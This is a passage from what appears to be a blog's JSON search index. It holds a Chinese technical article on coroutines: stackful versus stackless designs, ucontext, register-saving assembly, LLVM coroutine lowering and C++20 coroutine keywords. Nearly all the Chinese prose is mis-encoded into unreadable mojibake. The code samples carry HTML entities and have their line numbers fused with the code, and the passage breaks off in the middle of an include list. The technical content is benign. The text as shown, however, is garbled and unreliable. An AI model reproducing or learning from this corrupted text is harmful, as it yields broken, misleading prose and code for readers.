virtue.","categories":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/categories/Poetry/"},{"name":"1","slug":"Poetry/1","permalink":"https://racleray.github.io/categories/Poetry/1/"}],"tags":[{"name":"Poetry","slug":"Poetry","permalink":"https://racleray.github.io/tags/Poetry/"}],"author":"HeRui"},{"title":"åç¨‹æµ…æ","slug":"åç¨‹æµ…æ","date":"2023-12-02T13:48:25.000Z","updated":"2024-01-09T10:20:42.807Z","comments":true,"path":"posts/dd6997a0.html","link":"","permalink":"https://racleray.github.io/posts/dd6997a0.html","excerpt":"ä¸ºä»€ä¹ˆC++åç¨‹æ ‡å‡†åº“æ¥å¾—è¿™ä¹ˆæ™šæï¼Ÿ","text":"åç¨‹æ˜¯å¯ä»¥æš‚åœæ‰§è¡Œï¼Œä¹‹åæ¢å¤çš„å‡½æ•°ã€‚ æœ‰æ ˆåç¨‹ vs æ— æ ˆåç¨‹ æœ‰æ ˆåç¨‹é€šè¿‡å›ºå®šå¤§å°çš„æ ˆç©ºé—´ä½œä¸ºåç¨‹è¿è¡Œæ—¶ç©ºé—´ï¼Œåˆ‡æ¢åç¨‹å°±æ˜¯è¿™äº›å›ºå®šå¤§å°ç©ºé—´ç›´æ¥çš„åˆ‡æ¢ï¼Œåç¨‹å†…çš„ç¨‹åºé€»è¾‘å…¨éƒ¨è¿è¡Œåœ¨è¿™æ®µç©ºé—´å†…ã€‚è€Œæ— æ ˆåç¨‹å°† frame ä¿å­˜åœ¨å †ç©ºé—´ï¼ˆC++20 æ˜¯è¿™æ ·åšçš„ï¼‰ï¼Œä¾æ®åç¨‹çš„çŠ¶æ€è¿›è¡Œç»Ÿä¸€çš„è°ƒåº¦æ‰§è¡Œã€‚ æœ‰æ ˆåç¨‹ï¼Œæ¯ä¸ªåç¨‹ä¼šæœ‰å›ºå®šå¤§å°çš„ç©ºé—´ä½œä¸ºæ ˆå†…å­˜ä½¿ç”¨ã€‚ æ— æ ˆåç¨‹ï¼Œæ¯ä¸ªåç¨‹ä¼šæœ‰ä¸€ä¸ªåç¨‹å¸§ä½œä¸ºçŠ¶æ€å’Œå˜é‡çš„ç®¡ç†å¯¹è±¡ï¼Œç„¶åè¿›è¡Œç±»ä¼¼çŠ¶æ€æœºçš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹ã€‚ æ— æ ˆåç¨‹å†…å­˜ç´§å‡‘ï¼Œä½†æ˜¯ä¸é€‚åˆé€’å½’ã€‚æœ‰æ ˆåç¨‹è™½ç„¶é€‚åˆé€’å½’ï¼Œä½†æ˜¯åˆ†é…çš„å›ºå®šç©ºé—´ï¼Œå¯èƒ½ä¼šæµªè´¹ï¼Œä¹Ÿå¯èƒ½ä¼šä¸è¶³ï¼Œè¿™æ˜¯æœ‰æ ˆåç¨‹çš„é—®é¢˜ã€‚ æ€»çš„æ¥è¯´ï¼š æ— æ ˆçš„åˆ‡æ¢é€Ÿåº¦è¦è¿œé«˜äºæœ‰æ ˆã€‚ æ— æ ˆåç¨‹æ›´åŠ é€‚åˆIOåœºæ™¯ã€‚ æ— æ ˆåç¨‹ç›¸æ¯”æ™®é€šå‡½æ•°ä¼šæœ‰é¢å¤–å¼€é”€ã€‚ æ›´è¯¦ç»†çš„å¯¹æ¯”ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡ä¼˜è´¨çš„é‡åŒ–æ–‡æ¡£ï¼šåŸºäºasync_simpleçš„åç¨‹æ€§èƒ½å®šé‡åˆ†æ æœ‰æ ˆåç¨‹ æœ‰æ ˆåç¨‹ä¸å…³å¿ƒåç¨‹å‡½æ•°ä½“æ˜¯ä»€ä¹ˆï¼Œç›´æ¥å¼€è¾Ÿä¸€è¾¹å†…å­˜ï¼ˆgoroutine ä¸­æ˜¯ 2000 Bytesï¼‰ï¼Œå°†è¿™ç‰‡ç©ºé—´å’Œæ•´ä¸ªå‡½æ•°ä½“ï¼Œå‘ŠçŸ¥è°ƒåº¦å™¨å»è°ƒåº¦ã€‚è€Œåç¨‹å†…éƒ¨ï¼Œä¼šå®ç°æŸä¸ªå‡½æ•°æˆ–è€…è°ƒåº¦ç‚¹ï¼Œè¿è¡Œåˆ°æ­¤å¤„æ—¶ï¼Œä¼šè¯†åˆ«åˆ°å½“å‰å¤„äºåç¨‹ç©ºé—´ä¸­ï¼Œä¼šè½¬ç§»æ‰§è¡Œæƒï¼ˆæ¯”å¦‚ï¼Œç­‰å¾… IO æ—¶ï¼‰ã€‚åç¨‹å¹¶æ²¡æœ‰æ˜¾å¼çš„ await æš‚åœç‚¹å‡ºç°ï¼Œè€Œæ˜¯åœ¨åç¨‹å†…éƒ¨å®ç°ã€‚ åç¨‹æ ˆä¹Ÿå¯ä»¥æœ‰å…¶ä»–ä¸åŒçš„å®ç°æ–¹å¼ï¼š åˆ†æ®µæ ˆ(Segmented Stack)ï¼šç¼–è¯‘æ—¶ï¼Œä¸ºåç¨‹æ ˆå¢åŠ æ ˆå†…å­˜æ£€æµ‹æ ‡è®°ï¼Œæ£€æµ‹æ˜¯å¦å¤Ÿç”¨ï¼Œæ˜¯å¦éœ€è¦ç”³è¯·æ›´å¤šå†…å­˜ã€‚ æ‹·è´æ ˆ(Copy Stack)ï¼šé‡‡ç”¨å’Œ std::vector ç›¸åŒçš„æ–¹å¼ï¼ŒåŠ¨æ€æ‰©å±•å¹¶æ‹·è´æ ˆã€‚ å…±äº«æ ˆ(Shared Stack)ï¼šé¦–å…ˆç”³è¯·ä¸€å—è¾ƒå¤§å†…å­˜çš„å…±äº«æ ˆï¼Œç„¶åæ¯æ¬¡è¿è¡Œæ–°åç¨‹å‰ï¼Œå°†åç¨‹æ ˆå†…å­˜ copy å…±äº«æ ˆä¸­ï¼Œéšç€åç¨‹çš„è¿è¡Œè®¡ç®—çœŸæ­£ç”¨åˆ°çš„å†…å­˜ï¼Œå°†å…¶ copy åˆ°ä¸€æ®µåˆé€‚çš„å†…å­˜ä¸­ã€‚libco é‡‡ç”¨çš„å°±æ˜¯è¿™ç§æ–¹å¼ã€‚ è™šæ‹Ÿå†…å­˜æ ˆ(Virtual Memory Stack)ï¼šä¸ºæ¯ä¸ªåç¨‹ç”³è¯·è™šæ‹Ÿå†…å­˜ï¼Œä¸è¯»å†™å°±ä¸ä¼šå ç‰©ç†å†…å­˜ï¼ŒæŒ‰ç…§å®é™…ä½¿ç”¨çš„å†…å­˜é‡ç”³è¯·ç‰©ç†å†…å­˜é¡µé¢ã€‚ åç¨‹è°ƒåº¦æ–¹å¼ï¼š æ ˆå¼è°ƒåº¦ï¼ŒæŒ‰ç…§è°ƒç”¨æ ˆå…³ç³»ï¼Œæ¯æ¬¡æ‰§è¡Œè°ƒç”¨æ ˆæ ˆé¡¶çš„åç¨‹ æ˜Ÿå‹è°ƒåº¦ï¼Œæ¯æ¬¡æ‰§è¡Œå®Œä¸€ä¸ªåç¨‹ï¼Œå¿…é¡»åˆ‡æ¢å›è°ƒåº¦çº¿ç¨‹ï¼Œç„¶åå†è¿›å…¥ä¸‹ä¸€ä¸ªåç¨‹ ç¯å½¢è°ƒåº¦ï¼Œåç¨‹ä¹‹é—´æœ‰è°ƒç”¨é“¾ï¼Œä½†æ˜¯æ‰§è¡Œå®Œæœ€åä¸€ä¸ªåç¨‹åï¼Œç›´æ¥è¿”å›è°ƒåº¦çº¿ç¨‹ åç¨‹è°ƒåº¦çš„ä¼˜åŒ–æ–¹æ³•æœ‰ï¼š ç»“åˆå¤šçº¿ç¨‹ï¼Œå……åˆ†åˆ©ç”¨å¤šæ ¸èƒ½åŠ›ã€‚ æ¯ä¸ªçº¿ç¨‹è®¾è®¡åç¨‹é˜Ÿåˆ—ï¼ŒåŒæ—¶å¯ä»¥åˆ’åˆ†ä¸åŒçš„é˜Ÿåˆ—ç±»å‹ï¼ŒåŒºåˆ†èƒ½å¤Ÿåœ¨å¤šçº¿ç¨‹é—´è¿›è¡Œè½¬ç§»çš„åç¨‹ï¼Œå’Œä¸èƒ½è½¬ç§»çš„åç¨‹ã€‚ é‡‡ç”¨è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œè°ƒåº¦åç¨‹ï¼Œæ¯”å¦‚ï¼Œç©ºé—²çº¿ç¨‹ï¼ˆå¯ä»¥å®šä¹‰ä¸ºè¶…è¿‡æŸä¸ª\"æ°´ä½\"ï¼‰å¯ä»¥çªƒå–å¿™ç¢Œçº¿ç¨‹åç¨‹é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ã€‚ é˜Ÿåˆ—è®¾è®¡ä¼˜åŒ–ï¼Œæ¯”å¦‚å¯¹äºçŸ­æ—¶å¿«é€Ÿä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ spinlockï¼›å¯¹äºçº¿ç¨‹å†…çš„å°±ç»ªé˜Ÿåˆ—ï¼Œå¯ä»¥è§†æƒ…å†µï¼Œè®¾è®¡ä¸ºå¤šå†™ä¸€è¯»çš„ç»“æ„ï¼Œä»…åœ¨å†™ç«¯åŠ é”ã€‚ ä¿å­˜ä¸Šä¸‹æ–‡ï¼Œåˆ™æ˜¯å°†å¯„å­˜å™¨çš„å€¼ä¿å­˜ä¸‹æ¥ã€‚goroutine ä¹Ÿæ˜¯é‡‡ç”¨æœ‰æ ˆåç¨‹çš„æ–¹å¼å®ç°çš„ã€‚ boost.context, boost.coroutine, ucontext(unix), fiber(windows) è¿™äº›åº“æä¾›åº•å±‚ APIï¼Œæ²¡æœ‰å®ç°åç¨‹è°ƒåº¦æ¨¡å—ï¼Œä¸é€‚åˆç›´æ¥åšåº”ç”¨é¡¹ç›®ã€‚å¦å¤– ucontext è¢« fiber åº“æ€§èƒ½ç›¸å¯¹ä¼šè¾ƒå·®ä¸€ç‚¹ã€‚boost.context çš„æ€§èƒ½ä¼šæ›´å¥½ã€‚ è…¾è®¯çš„ libco è™½ç„¶åšäº†åç¨‹è°ƒåº¦ï¼Œä¹Ÿå…¼å®¹å¾ˆå¤šç¬¬ä¸‰æ–¹åº“çš„è°ƒç”¨æ¥å£ï¼Œä½†æ˜¯ä¹Ÿéœ€è¦å¯¹åº•å±‚æœºåˆ¶è¾ƒä¸ºæ¸…æ¥šï¼Œæ‰èƒ½å†™å‡ºæ›´ç¨³å®šçš„ä»£ç ã€‚æ¯”å¦‚ï¼Œä¸åŒçš„ç³»ç»Ÿã€ä¸åŒç‰ˆæœ¬çš„Linuxéƒ½éœ€è¦ä¸åŒçš„æ±‡ç¼–ä»£ç ã€‚ ä¸€ä¸ªç®€å•çš„æ±‡ç¼–ç¨‹åºç¤ºä¾‹ï¼š 12345678910111213141516171819&#x2F;&#x2F; ä¿å­˜8ä¸ª32ä½å…ƒç´ çš„æ•°ç»„ï¼Œæ•°ç»„é¦–åœ°å€ä¿å­˜åœ¨ eax å¯„å­˜å™¨movl %esp, 28(%eax) movl %ebp, 24(%eax)movl %esi, 20(%eax)movl %edi, 16(%eax)movl %edx, 12(%eax)movl %ecx, 8(%eax)movl %ebx, 4(%eax)&#x2F;&#x2F; eax æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ &#x2F;&#x2F; å‡è®¾æ–°ä¸Šä¸‹æ–‡ä¸­ä» esp + 8 çš„ä½ç½®å¼€å§‹æ¢å¤æ•°ç»„å…ƒç´ åˆ°å¯„å­˜å™¨movl 8(%esp), %eax movl 4(%eax), %ebxmovl 8(%eax), %ecxmovl 12(%eax), %edx movl 16(%eax), %edimovl 20(%eax), %esimovl 24(%eax), %ebpmovl 28(%eax), %esp å‡è®¾è¿™æ˜¯ä¸€ä¸ªå‡½æ•°å†…çš„ä¸€æ®µä»£ç ï¼Œå…¶ä¸­ eax ä¸ºä¼ å…¥æ•°ç»„é¦–åœ°å€ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œesp + 8 ä¸ºå¦ä¸€ä¸ªæ•°ç»„é¦–åœ°å€ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚ä»¥ä¸Šä»£ç ï¼Œå°±å°†æ˜¯å°†å½“å‰ä¸Šä¸‹æ–‡å¯„å­˜å™¨ä¿å­˜åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„æ•°ç»„ä¸­ï¼Œç„¶åä»ç¬¬äºŒä¸ªæ•°ç»„ä¸­åŠ è½½æ–°çš„ä¸Šä¸‹æ–‡çš„å¯„å­˜å™¨çš„å€¼ã€‚ è¿™ç§åµŒå¥—åˆ‡æ¢ä¸Šä¸‹æ–‡çš„æ–¹å¼ï¼Œä¿è¯å½“å‰è°ƒç”¨æ ˆæ ˆé¡¶çš„åç¨‹å…ˆæ‰§è¡Œç»“æŸï¼Œç„¶åæ‰§è¡Œå‰ä¸€ä¸ªåç¨‹ã€‚è¿™ç§æœ‰æ˜æ˜¾å±‚çº§åˆ‡æ¢ç»“æ„çš„åç¨‹ï¼Œä¹Ÿç§°ä¸º éå¯¹ç§°åç¨‹ã€‚ ucontext_t 12345678910111213141516171819202122232425262728293031// ä¸Šä¸‹æ–‡ç»“æ„ä½“typedef struct ucontext_t &#123; // å½“å‰ä¸Šä¸‹æ–‡ç»“æŸåï¼Œä¸‹ä¸€ä¸ªæ¿€æ´»çš„ä¸Šä¸‹æ–‡å¯¹è±¡çš„æŒ‡é’ˆï¼Œåªåœ¨å½“å‰ä¸Šä¸‹æ–‡æ˜¯ç”±makecontextåˆ›å»ºæ—¶æœ‰æ•ˆ struct ucontext_t *uc_link; // å½“å‰ä¸Šä¸‹æ–‡çš„ä¿¡å·å±è”½æ©ç  sigset_t uc_sigmask; // å½“å‰ä¸Šä¸‹æ–‡ä½¿ç”¨çš„æ ˆå†…å­˜ç©ºé—´ï¼Œåªåœ¨å½“å‰ä¸Šä¸‹æ–‡æ˜¯ç”±makecontextåˆ›å»ºæ—¶æœ‰æ•ˆ stack_t uc_stack; // å¹³å°ç›¸å…³çš„ä¸Šä¸‹æ–‡å…·ä½“å†…å®¹ï¼ŒåŒ…å«å¯„å­˜å™¨çš„å€¼ mcontext_t uc_mcontext; ...&#125; ucontext_t;// è·å–å½“å‰çš„ä¸Šä¸‹æ–‡int getcontext(ucontext_t *ucp);// å°† getcontext è·å–åˆ°çš„ä¸Šä¸‹æ–‡æŒ‡é’ˆucpï¼Œä¸ä¸€ä¸ªå‡½æ•° func è¿›è¡Œç»‘å®šï¼Œæ”¯æŒæŒ‡å®šfuncè¿è¡Œæ—¶çš„å‚æ•°ï¼Œ// åœ¨è°ƒç”¨ makecontext ä¹‹å‰ï¼Œå¿…é¡»æ‰‹åŠ¨ç»™ ucp åˆ†é…ä¸€æ®µå†…å­˜ç©ºé—´ï¼Œå­˜å‚¨åœ¨ ucp-&gt;uc_stack ä¸­ï¼Œä½œä¸º func å‡½æ•°è¿è¡Œæ—¶çš„æ ˆç©ºé—´ï¼Œ// å¯ä»¥æŒ‡å®š ucp-&gt;uc_linkï¼Œfunc è¿è¡Œç»“æŸåæ¢å¤ uc_link æŒ‡å‘çš„ä¸Šä¸‹æ–‡// makecontext æ‰§è¡Œå®Œåï¼Œucpå°±ä¸å‡½æ•°funcç»‘å®šäº†ï¼Œè°ƒç”¨ setcontext æˆ– swapcontext æ¿€æ´» ucp æ—¶ï¼Œfunc å°±ä¼šè¢«è¿è¡Œ// å¦‚æœä¸æŒ‡å®š uc_linkï¼Œé‚£ funcå‡½æ•°ç»“æŸæ—¶å¿…é¡»æ˜¾å¼è°ƒç”¨ setcontext æˆ– swapcontext ä»¥é‡æ–°æŒ‡å®šä¸€ä¸ªæœ‰æ•ˆçš„ä¸Šä¸‹æ–‡ï¼Œå¦åˆ™ç¨‹åºå°±è·‘é£äº†void makecontext(ucontext_t *ucp, void (*func)(), int argc, ...);// æ¢å¤ ucp æŒ‡å‘çš„ä¸Šä¸‹æ–‡ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè·³è½¬åˆ° ucpä¸Šä¸‹æ–‡ å¯¹åº”çš„å‡½æ•°ä¸­æ‰§è¡Œï¼Œç›¸å½“äºå˜ç›¸è°ƒç”¨äº†å‡½æ•°ï¼Œä½†æ˜¯ä¸ä¼šè¿”å›ã€‚int setcontext(const ucontext_t *ucp);// æ¢å¤ ucp æŒ‡å‘çš„ä¸Šä¸‹æ–‡ï¼ŒåŒæ—¶å°†å½“å‰çš„ä¸Šä¸‹æ–‡å­˜å‚¨åˆ° oucp ä¸­// å’Œ setcontext ä¸€æ ·ï¼Œswapcontext ä¼šè·³è½¬åˆ° ucpä¸Šä¸‹æ–‡ å¯¹åº”çš„å‡½æ•°ä¸­æ‰§è¡Œï¼Œä½†æ˜¯ä¸ä¼šè¿”å›int swapcontext(ucontext_t *oucp, const ucontext_t *ucp); æ— æ ˆåç¨‹ æ— æ ˆåç¨‹çš„å…¸å‹å®ç°æ˜¯ async / await æ¨¡å‹ã€‚async æ ‡å¿—ä¼šä½¿å¾—ç¼–è¯‘å™¨ï¼Œåˆ›å»ºä¸€ä¸ªåç¨‹å¸§ï¼Œä¿å­˜å‡½æ•°å‚æ•°ã€è·¨è¶Šåç¨‹æš‚åœç‚¹çš„å±€éƒ¨å˜é‡ã€‚await è¡¨ç¤ºç¨‹åºåœ¨è¿™é‡Œè½¬ç§»æ‰§è¡Œæƒï¼Œç­‰å¾… await åé¢çš„ç¨‹åºæ‰§è¡Œå®Œæˆï¼Œç¼–è¯‘å™¨åº”è¯¥åœ¨è¿™ä¹‹åå»ç”Ÿæˆè½¬ç§»æ‰§è¡Œæƒçš„ä»£ç ã€‚ æ— æ ˆåç¨‹æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªçŠ¶æ€æœºï¼ˆstate machineï¼‰ï¼Œåˆ©ç”¨ç³»ç»Ÿæ ˆè¿›è¡Œåç¨‹åˆ‡æ¢ã€‚æ¢å¤æ‰§è¡Œæ‰€éœ€çš„æ•°æ®ï¼Œå’Œç¨‹åºè¿è¡Œæ—¶çš„æ ˆæ˜¯åˆ†ç¦»å­˜å‚¨çš„ã€‚æ¯”å¦‚æŠŠåç¨‹çš„ frame æ•°æ®æ”¾åœ¨å †ä¸­ï¼Œè€Œä¸æ˜¯æ ˆä¸­ï¼Œä¹Ÿå°±ä¸ä¼šåœ¨å‡½æ•°è¿”å›æ—¶è¢«å›æ”¶ã€‚ä»è€Œå¯ä»¥å®ç°å¼‚æ­¥æ‰§è¡Œçš„é¡ºåºä»£ç ï¼Œä¸ç”¨æ˜¾å¼çš„å›è°ƒæ¥å¤„ç†éé˜»å¡çš„è¾“å…¥å’Œè¾“å‡ºã€‚ 12345678910111213141516171819202122232425262728293031// æ— æ ˆåç¨‹æŠ½è±¡å‡ºçš„ä¸€ä¸ªç±»struct abstract_coroutine &#123; int val; int state = 0; // interface void run() &#123; switch (state) &#123; case 0: return sub_proc_1(); case 1: return sub_proc_2(); case 2: return sub_proc_3(); &#125; &#125; void sub_proc_1() &#123; val = 0; state = 1; &#125; void sub_proc_2() &#123; val = 1; state = 2; &#125; void sub_proc_3() &#123; val--; &#125;&#125;; æ¯ä¸ªéƒ¨åˆ†æ‰§è¡Œå®Œæˆåï¼ŒçŠ¶æ€è½¬ç§»ã€‚ä¸‹ä¸€æ¬¡è°ƒç”¨ run æ—¶ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªå‡½æ•°è°ƒç”¨ã€‚è¿™ç§æ–¹å¼ï¼Œæ²¡æœ‰æœ‰æ ˆåç¨‹çš„æ˜¾å¼ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚è¿™ç§æ–¹å¼å’Œå‡½æ•°æ‰§è¡Œå’Œè¿”å›å‡ ä¹æ²¡æœ‰åŒºåˆ«ã€‚éš¾ç‚¹åœ¨äºå¦‚ä½•å®ç°é«˜æ•ˆåœ°åç¨‹è°ƒåº¦æœºåˆ¶ã€‚ å¯¹ç§°åç¨‹ vs éå¯¹ç§°åç¨‹ éå¯¹ç§°åç¨‹ï¼Œåç¨‹ä¹‹é—´æœ‰ä¸¥æ ¼çš„çˆ¶å­å…³ç³»ï¼Œç”±è°ƒåº¦å™¨è´Ÿè´£æ‰€æœ‰è°ƒåº¦ã€‚ å¯¹ç§°å¼åç¨‹ï¼Œåç¨‹ä¹‹é—´åœ°ä½å¹³ç­‰ã€‚ Coroutines in C LLVM Coroutines å®ç°çš„æ— æ ˆåç¨‹ä¼ªä»£ç ï¼š 123456789101112131415161718void *f(int n) &#123; void *hdl = CORO_BEGIN(malloc); for (int i = n;; ++i) &#123; CORO_SUSPEND(hdl); print(i); CORO_SUSPEND(hdl); print(-i); &#125; CORO_END(hdl, free);&#125;int main() &#123; void *coro = f(1); for (int i = 0; i &lt; 4; ++i) &#123; CORO_RESUME(coro); &#125; CORO_DESTROY(coro);&#125; ä»¥ä¸Šç¨‹åºçš„åç¨‹å¸§æ•°æ®å¯ä»¥å®šä¹‰å¦‚ä¸‹ï¼š 1234struct f.frame &#123; // åªæœ‰ i è·¨è¶Šäº†åç¨‹çš„è°ƒç”¨ï¼Œè€Œ n åœ¨åç¨‹ SUSPEND å¤„ç†ä¹‹å‰å·²ç»æ²¡ç”¨äº† int i;&#125;; è€Œç¼–è¯‘å™¨ä¼šç»§ç»­ä¼˜åŒ–ï¼Œæ¯”å¦‚ï¼š 123456789101112131415161718192021void *f(int n) &#123; void *hdl = CORO_BEGIN(malloc); f.frame *frame = (f.frame *)hdl; for (frame-&gt;i = n;; ++frame-&gt;i) &#123; frame-&gt;suspend_index = 0; r0: CORO_SUSPEND(hdl); print(frame-&gt;i); frame-&gt;suspend_index = 1; r1: CORO_SUSPEND(hdl); print(-frame-&gt;i); &#125; CORO_END(hdl, free);&#125;// æ­¤æ—¶åç¨‹å¸§æ•°æ®struct f.frame &#123; int suspend_index; int i;&#125;; ç¼–è¯‘å™¨åŒæ—¶ï¼Œä¼šç”Ÿæˆä¸‰ä¸ªå‡½æ•°è°ƒç”¨ï¼š 123456789101112131415161718192021222324252627282930313233343536373839// coroutine start functionvoid* f(int *n) &#123; void* hdl = CORO_BEGIN(malloc); f.frame* frame = (f.frame*)hdl; frame-&gt;ResumeFn = &amp;f.resume; frame-&gt;DestroyFn = &amp;f.destroy; frame-&gt;i = n; frame-&gt;suspend_index = 0; return coro_hdl;&#125;// coroutine resume functionvoid f.resume(f.frame *frame) &#123; switch (frame-&gt;suspend_index) &#123; case 0: goto r0; default: goto r1; &#125; for (frame-&gt;i = n;; ++frame-&gt;i) &#123; frame-&gt;suspend_index = 0; r0: CORO_SUSPEND(hdl); print(frame-&gt;i); frame-&gt;suspend_index = 1; r1: CORO_SUSPEND(hdl); print(-frame-&gt;i); &#125; CORO_END(hdl, free);&#125;// coroutine destroy functionvoid f.destroy(f.frame *frame) &#123; switch (frame-&gt;suspend_index) &#123; â€¦ &#125; free(frame);&#125; æ­¤æ—¶çš„åç¨‹å¸§ä¸­æ•°æ®ä¸ºï¼š 123456struct f.frame &#123; FnPtr ResumeFn; FnPtr DestroyFn; int suspend_index; int i;&#125;; LLVM Coroutines ä¸­å®šä¹‰äº†ä»¥ä¸‹å®ï¼Œç”¨äºå¤„ç†åç¨‹çš„ä¸åŒçŠ¶æ€ï¼š 12345678910111213141516171819#define CORO_SUSPEND() \\ switch (__builtin_coro_suspend()) &#123; \\ case -1: \\ goto coro_Suspend; \\ case 1: \\ goto coro_Cleanup; \\ default: \\ break; \\ &#125;#define CORO_END(hdl, FreeFunc) \\ coro_Cleanup : &#123; \\ void *coro_mem = __builtin_coro_free(hdl); \\ if (coro_mem) \\ FreeFunc(coro_mem); \\ &#125; \\ coro_Suspend: \\ __builtin_coro_end(); \\ return coro_hdl; C++20 åç¨‹ C++20 åç¨‹æ˜¯æ— æ ˆåç¨‹ã€‚å®šä¹‰ä¸­åŒ…å«äº†ä»¥ä¸‹3ç§è¡¨è¾¾å¼ä¹‹ä¸€çš„å‡½æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªåç¨‹ã€‚ co_await è¡¨è¾¾å¼â€”â€”ç”¨äºæš‚åœæ‰§è¡Œï¼Œç›´åˆ°æ¢å¤ï¼š 123456789task&lt;&gt; tcp_echo_server()&#123; char data[1024]; while (true) &#123; std::size_t n = co_await socket.async_read_some(buffer(data)); co_await async_write(socket, buffer(data, n)); &#125;&#125; co_yield è¡¨è¾¾å¼â€”â€”ç”¨äºæš‚åœæ‰§è¡Œå¹¶è¿”å›ä¸€ä¸ªå€¼ï¼š 12345generator&lt;int&gt; iota(int n = 0)&#123; while (true) co_yield n++;&#125; co_return è¯­å¥â€”â€”ç”¨äºå®Œæˆæ‰§è¡Œå¹¶è¿”å›ä¸€ä¸ªå€¼ï¼š 1234lazy&lt;int&gt; f()&#123; co_return 7;&#125; æ¯ä¸ªåç¨‹éƒ½ä¸ä¸‹åˆ—å¯¹è±¡å…³è”ï¼š æ‰¿è¯ºï¼ˆpromiseï¼‰å¯¹è±¡ï¼Œåœ¨åç¨‹å†…éƒ¨æ“çºµã€‚åç¨‹é€šè¿‡æ­¤å¯¹è±¡æäº¤å…¶ç»“æœæˆ–å¼‚å¸¸ã€‚ åç¨‹å¥æŸ„ (coroutine handle)ï¼Œåœ¨åç¨‹å¤–éƒ¨æ“çºµã€‚è¿™æ˜¯ç”¨äºæ¢å¤åç¨‹æ‰§è¡Œæˆ–é”€æ¯åç¨‹å¸§çš„ä¸å¸¦æ‰€æœ‰æƒå¥æŸ„ã€‚ åç¨‹çŠ¶æ€ (coroutine state)ï¼Œå®ƒæ˜¯ä¸€ä¸ªåŠ¨æ€å­˜å‚¨åˆ†é…ï¼ˆé™¤éè‡ªå®šä¹‰åˆ†é…æ–¹å¼ï¼‰çš„å†…éƒ¨å¯¹è±¡ï¼Œå…¶åŒ…å«ï¼š promise å¯¹è±¡ å„ä¸ªå½¢å‚ï¼ˆå…¨éƒ¨æŒ‰å€¼å¤åˆ¶ï¼‰ å½“å‰æš‚åœç‚¹çš„ä¸€äº›è¡¨ç¤ºï¼Œä½¿å¾—ç¨‹åºåœ¨æ¢å¤æ—¶çŸ¥æ™“è¦ä»ä½•å¤„ç»§ç»­ï¼Œé”€æ¯æ—¶çŸ¥æ™“æœ‰å“ªäº›å±€éƒ¨å˜é‡åœ¨ä½œç”¨åŸŸå†… ç”Ÿå­˜æœŸè¶…è¿‡å½“å‰æš‚åœç‚¹çš„å±€éƒ¨å˜é‡å’Œä¸´æ—¶é‡ å½“åç¨‹å¼€å§‹æ‰§è¡Œæ—¶ï¼Œå®ƒè¿›è¡Œä¸‹åˆ—æ“ä½œï¼š ç”¨ operator new åˆ†é…åç¨‹çŠ¶æ€å¯¹è±¡ å°†æ‰€æœ‰å‡½æ•°å½¢å‚å¤åˆ¶åˆ°åç¨‹çŠ¶æ€ä¸­ï¼šæŒ‰å€¼ä¼ é€’çš„å½¢å‚è¢«ç§»åŠ¨æˆ–å¤åˆ¶ï¼ŒæŒ‰å¼•ç”¨ä¼ é€’çš„å‚æ•°ä¿æŒä¸ºå¼•ç”¨ï¼ˆå› æ­¤ï¼Œå¦‚æœåœ¨è¢«æŒ‡ä»£å¯¹è±¡çš„ç”Ÿå­˜æœŸç»“æŸåæ¢å¤åç¨‹ï¼Œå®ƒå¯èƒ½å˜æˆæ‚¬å‚å¼•ç”¨ï¼‰ è°ƒç”¨æ‰¿è¯ºå¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚å¦‚æœæ‰¿è¯ºç±»å‹æ‹¥æœ‰æ¥æ”¶æ‰€æœ‰åç¨‹å½¢å‚çš„æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆä»¥å¤åˆ¶åçš„åç¨‹å®å‚è°ƒç”¨è¯¥æ„é€ å‡½æ•°ã€‚å¦åˆ™è°ƒç”¨å…¶é»˜è®¤æ„é€ å‡½æ•°ã€‚ è°ƒç”¨ promise.get_return_object() å¹¶å°†ç»“æœä¿å­˜åœ¨å±€éƒ¨å˜é‡ä¸­ã€‚è¯¥è°ƒç”¨çš„ç»“æœå°†åœ¨åç¨‹é¦–æ¬¡æš‚åœæ—¶è¿”å›ç»™è°ƒç”¨æ–¹ã€‚è‡³æ­¤å¹¶åŒ…å«è¿™ä¸ªæ­¥éª¤ä¸ºæ­¢ï¼Œä»»ä½•æŠ›å‡ºçš„å¼‚å¸¸å‡ä¼ æ’­å›è°ƒç”¨æ–¹ï¼Œè€Œéç½®äº promise ä¸­ã€‚ è°ƒç”¨ promise.initial_suspend() å¹¶ co_await å®ƒçš„ç»“æœã€‚å…¸å‹çš„æ‰¿è¯ºç±»å‹ Promise è¦ä¹ˆï¼ˆå¯¹äºæƒ°æ€§å¯åŠ¨çš„åç¨‹ï¼‰è¿”å›std::suspend_alwaysï¼Œè¦ä¹ˆï¼ˆå¯¹äºæ€¥åˆ‡å¯åŠ¨çš„åç¨‹ï¼‰è¿”å›std::suspend_neverã€‚ å½“ co_await promise.initial_suspend() æ¢å¤æ—¶ï¼Œå¼€å§‹åç¨‹ä½“çš„æ‰§è¡Œã€‚ ä¸€ä¸ªè·¨çº¿ç¨‹è°ƒåº¦åç¨‹ç¤ºä¾‹ ç¨‹åºå®ç°äº† producer åç¨‹è¿è¡Œåœ¨çº¿ç¨‹2ä¸­ï¼Œ 500ms åç”Ÿæˆä¸€ä¸ª val ï¼›consumer åç¨‹è¿è¡Œåœ¨çº¿ç¨‹ 1 ä¸­ï¼Œå¹¶ä¼šè¢«è°ƒåº¦åˆ°çº¿ç¨‹2 ä¸­æ‰§è¡Œï¼Œæœ€åè¯»å–å‡º valã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111#include &lt;coroutine&gt;#include &lt;chrono&gt;#include &lt;future&gt;#include &lt;iostream&gt;#include 